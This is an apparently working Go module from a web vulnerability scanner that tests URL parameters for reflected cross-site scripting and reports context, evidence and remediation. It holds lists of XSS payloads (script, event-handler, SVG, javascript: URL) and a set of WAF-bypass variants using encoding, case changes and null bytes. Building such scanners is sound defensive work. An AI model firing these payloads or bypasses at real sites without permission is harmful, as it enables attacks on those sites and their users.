package injection

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// XSSContext represents where XSS payload appears in response
type XSSContext string

const (
	HTMLContext      XSSContext = "HTML Body"
	AttributeContext XSSContext = "HTML Attribute"
	ScriptContext    XSSContext = "Script Block"
	EventContext     XSSContext = "Event Handler"
	URLContext       XSSContext = "URL"
	CommentContext   XSSContext = "HTML Comment"
)

// XSSVulnerability represents a detected XSS vulnerability
type XSSVulnerability struct {
	Type        InjectionType
	URL         string
	Parameter   string
	Payload     string
	Context     XSSContext
	Evidence    string
	Severity    string
	Confidence  float64
	Description string
	Remediation string
}

// testXSS tests for Cross-Site Scripting vulnerabilities
func (t *Tester) TestXSS(targetURL, parameter string) *XSSVulnerability {
	// XSS test payloads with markers
	payloads := []struct {
		payload string
		marker  string
		context XSSContext
	}{
		// Basic reflection test
		{`<script>alert('XSS_TEST_12345')</script>`, "XSS_TEST_12345", HTMLContext},
		{`"><script>alert('XSS')</script>`, "XSS", AttributeContext},

		// Event handlers
		{`" onload="alert('XSS')"`, "onload=", EventContext},
		{`' onerror='alert(1)'`, "onerror=", EventContext},

		// Polyglot payloads
		{`'"><img src=x onerror=alert(1)>`, "onerror=", HTMLContext},
		{`javascript:alert(1)`, "javascript:", URLContext},

		// SVG-based
		{`<svg/onload=alert(1)>`, "<svg", HTMLContext},

		// Advanced bypasses
		{`<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`, "onerror=", HTMLContext},
		{`<iframe src="javascript:alert(1)">`, "iframe", HTMLContext},
	}

	for _, p := range payloads {
		if vuln := t.testSingleXSSPayload(targetURL, parameter, p.payload, p.marker, p.context); vuln != nil {
			return vuln
		}
	}

	return nil
}

// testSingleXSSPayload tests a single XSS payload
func (t *Tester) testSingleXSSPayload(targetURL, parameter, payload, marker string, xssContext XSSContext) *XSSVulnerability {
	// Inject payload
	testURL := t.injectPayload(targetURL, parameter, payload)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)

	// Check if payload is reflected
	if strings.Contains(bodyStr, payload) || strings.Contains(bodyStr, marker) {
		// Analyze context
		detectedContext := t.analyzeXSSContext(bodyStr, payload)

		// Calculate confidence based on context
		confidence := 0.7
		if detectedContext == ScriptContext || detectedContext == EventContext {
			confidence = 0.95
		}

		evidence := t.extractXSSEvidence(bodyStr, payload, 100)

		return &XSSVulnerability{
			Type:        XSSInjection,
			URL:         targetURL,
			Parameter:   parameter,
			Payload:     payload,
			Context:     detectedContext,
			Evidence:    evidence,
			Severity:    "High",
			Confidence:  confidence,
			Description: fmt.Sprintf("Cross-Site Scripting (XSS) vulnerability detected in parameter '%s'. Payload was reflected in %s context.", parameter, detectedContext),
			Remediation: "Implement proper output encoding based on context (HTML entity encoding, JavaScript encoding, URL encoding). Use Content Security Policy (CSP) headers. Validate and sanitize all user inputs.",
		}
	}

	return nil
}

// analyzeXSSContext determines where the payload appears in the response
func (t *Tester) analyzeXSSContext(body, payload string) XSSContext {
	// Escape regex special characters in payload
	escapedPayload := regexp.QuoteMeta(payload)

	// Check for script context
	scriptPattern := fmt.Sprintf(`<script[^>]*>.*?%s.*?</script>`, escapedPayload)
	if matched, _ := regexp.MatchString(scriptPattern, body); matched {
		return ScriptContext
	}

	// Check for event handler context
	eventPattern := fmt.Sprintf(`on\w+\s*=\s*['"]?[^'"]*%s`, escapedPayload)
	if matched, _ := regexp.MatchString(eventPattern, body); matched {
		return EventContext
	}

	// Check for attribute context
	attrPattern := fmt.Sprintf(`<[^>]+\s+\w+\s*=\s*['"]?[^'"]*%s`, escapedPayload)
	if matched, _ := regexp.MatchString(attrPattern, body); matched {
		return AttributeContext
	}

	// Check for URL context
	if matched, _ := regexp.MatchString(`href\s*=|src\s*=`, body); matched {
		return URLContext
	}

	// Check for comment context
	commentPattern := fmt.Sprintf(`<!--.*?%s.*?-->`, escapedPayload)
	if matched, _ := regexp.MatchString(commentPattern, body); matched {
		return CommentContext
	}

	// Default to HTML context
	return HTMLContext
}

// extractXSSEvidence extracts relevant evidence showing XSS
func (t *Tester) extractXSSEvidence(body, payload string, contextLen int) string {
	idx := strings.Index(body, payload)
	if idx == -1 {
		return "Payload reflected but not found in exact form"
	}

	start := idx - contextLen
	if start < 0 {
		start = 0
	}

	end := idx + len(payload) + contextLen
	if end > len(body) {
		end = len(body)
	}

	evidence := body[start:end]

	// Clean up for display
	evidence = strings.ReplaceAll(evidence, "\n", " ")
	evidence = strings.ReplaceAll(evidence, "\r", "")
	evidence = regexp.MustCompile(`\s+`).ReplaceAllString(evidence, " ")

	return "..." + evidence + "..."
}

// GenerateContextSpecificPayloads generates XSS payloads based on detected context
func GenerateContextSpecificPayloads(context XSSContext) []string {
	switch context {
	case HTMLContext:
		return []string{
			`<script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`<body onload=alert(1)>`,
		}
	case AttributeContext:
		return []string{
			`" onload="alert(1)`,
			`' onerror='alert(1)`,
			`"><script>alert(1)</script><"`,
		}
	case ScriptContext:
		return []string{
			`'; alert(1); //`,
			`"; alert(1); //`,
			`</script><script>alert(1)</script>`,
		}
	case EventContext:
		return []string{
			`alert(1)`,
			`javascript:alert(1)`,
			`&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`,
		}
	case URLContext:
		return []string{
			`javascript:alert(1)`,
			`data:text/html,<script>alert(1)</script>`,
		}
	default:
		return []string{`<script>alert(1)</script>`}
	}
}

// GetXSSBypassTechniques returns common WAF bypass techniques
func GetXSSBypassTechniques() map[string][]string {
	return map[string][]string{
		"Case_Variation": {
			`<ScRiPt>alert(1)</sCrIpT>`,
			`<IMG SRC=x onerror=alert(1)>`,
		},
		"Encoding": {
			`<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`,
			`<img src=x onerror="\x61\x6c\x65\x72\x74(1)">`,
		},
		"Tag_Breaking": {
			`<<script>alert(1)</script>`,
			`<script>alert(1)<!--`,
		},
		"Null_Byte": {
			`<script\x00>alert(1)</script>`,
			`<img src=x\x00onerror=alert(1)>`,
		},
		"Alternative_Tags": {
			`<svg/onload=alert(1)>`,
			`<marquee onstart=alert(1)>`,
			`<details open ontoggle=alert(1)>`,
		},
	}
}
